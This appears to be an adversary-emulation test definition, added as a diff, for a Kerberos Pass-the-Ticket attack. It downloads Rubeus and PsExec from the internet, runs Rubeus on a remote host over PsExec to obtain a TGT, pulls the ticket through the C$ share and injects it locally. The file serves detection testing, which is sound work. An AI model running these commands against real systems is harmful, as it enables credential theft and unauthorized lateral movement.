@@ -1,0 +1,56 @@
+api_version: "2.0"
+name: Rubeus Kerberos Pass The Ticket
+description: |
+    Requesting a TGT on a remote system and retrieving it locally before requesting a service ticket with it. This is a Pass-The-Ticket attack because the TGT is obtained on the remote system, then used from a different machine (local).
+    PsExec is used to execute commands on the remote system, and the "C$" admin share is used to retrieve the TGT, so the current user must have admin rights remotely and other PsExec prerequisites must be met.
+args:
+    - name: password
+      type: string
+      default: Password
+    - name: domain
+      type: string
+      default: $Env:USERDOMAIN
+    - name: rubeus_url
+      type: string
+      default: https://github.com/morgansec/Rubeus/raw/de21c6607e9a07182a2d2eea20bb67a22d3fbf95/Rubeus/bin/Debug/Rubeus45.exe
+    - name: target
+      type: string
+      default: localhost
+    - name: user_name
+      type: string
+      default: Administrator
+uuid: a2fc4ec5-12c6-4fb4-b661-961f23f359cb
+mitre:
+    tactics:
+        - 'TA0005: Defense Evasion'
+        - 'TA0008: Lateral Movement'
+    techniques:
+        - 'T1550: Use Alternate Authentication Material'
+    subtechniques:
+        - 'T1550.003: Pass the Ticket'
+requirements:
+    platforms:
+        - os: windows
+steps:
+    - name: |
+        Rubeus must exist on disk at "PathToAtomicsFolder\..\ExternalPayloads\rubeus.exe"
+      inline: |
+        if (Test-Path "PathToAtomicsFolder\..\ExternalPayloads\rubeus.exe") {exit 0} else {{New-Item -Type Directory "PathToAtomicsFolder\..\ExternalPayloads\" -ErrorAction Ignore -Force | Out-Null
+        Invoke-Webrequest -Uri #{rubeus_url} -OutFile "PathToAtomicsFolder\..\ExternalPayloads\rubeus.exe"
+        }}
+      executor: powershell
+    - name: |
+        PsExec must exist on disk at "PathToAtomicsFolder\..\ExternalPayloads\PsExec.exe"
+      inline: |
+        if (Test-Path "PathToAtomicsFolder\..\ExternalPayloads\PsExec.exe") {exit 0} else {{Invoke-WebRequest "https://download.sysinternals.com/files/PSTools.zip" -OutFile "PathToAtomicsFolder\..\ExternalPayloads\PsTools.zip"
+        Expand-Archive "PathToAtomicsFolder\..\ExternalPayloads\PsTools.zip" "PathToAtomicsFolder\..\ExternalPayloads\PsTools" -Force
+        New-Item -ItemType Directory (Split-Path "PathToAtomicsFolder\..\ExternalPayloads\PsExec.exe") -Force | Out-Null
+        Copy-Item "PathToAtomicsFolder\..\ExternalPayloads\PsTools\PsExec.exe" "PathToAtomicsFolder\..\ExternalPayloads\PsExec.exe" -Force
+        }}
+      executor: powershell
+    - name: rubeus-kerberos-pass-the-ticket
+      inline: "& \"PathToAtomicsFolder\\..\\ExternalPayloads\\PsExec.exe\" -accepteula \\\\{{.Args.target}} -w c:\\ -c \"PathToAtomicsFolder\\..\\ExternalPayloads\\rubeus.exe\" asktgt /user:{{.Args.user_name}} /password:{{.Args.password}} /domain:{{.Args.domain}} /outfile:ticket.kirbi\nSet-Location \"PathToAtomicsFolder\\..\\ExternalPayloads\"\nMove-Item -Force \"\\\\{{.Args.target}}\\c$\\ticket.kirbi\" ticket.kirbi\nWrite-Host \"Successfully retrieved TGT from '{{.Args.target}}', now requesting a TGS from local\"\n& \"PathToAtomicsFolder\\..\\ExternalPayloads\\rubeus.exe\" asktgs /service:cifs/{{.Args.target}} /ticket:ticket.kirbi /ptt\nRemove-Item \"PathToAtomicsFolder\\..\\ExternalPayloads\\ticket.kirbi\"\n& \"PathToAtomicsFolder\\..\\ExternalPayloads\\rubeus.exe\" purge      "
+      executor: powershell
+      cleanup:
+        inline: ""
+        executor: powershell
